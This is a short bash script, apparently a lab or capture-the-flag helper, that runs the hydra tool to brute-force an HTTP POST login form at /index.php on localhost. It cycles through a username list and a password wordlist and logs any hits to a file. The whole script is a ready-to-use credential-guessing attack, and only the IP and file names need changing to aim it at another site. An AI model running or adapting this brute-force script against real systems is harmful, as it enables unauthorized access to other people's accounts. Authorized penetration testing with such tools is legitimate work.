#!/bin/bash
# Will build a better script at a later stage
# use this for now.

IP="127.0.0.1"
INDEXFILE="/index.php"

USERLIST='users.txt'
WORDLIST='wordlist.txt'
BADLOGINMESSAGE="Bad login"

echo "[INFO]: Performing hydra HTTP scan against ${IP}"

hydra ${IP} http-form-post "${INDEXFILE}:user=^USER^&pass=^PASS^:${BADLOGINMESSAGE}" -L ${USERLIST} -P ${WORDLIST} -t 10 -w 30 -o hydra-http-post-attack.txt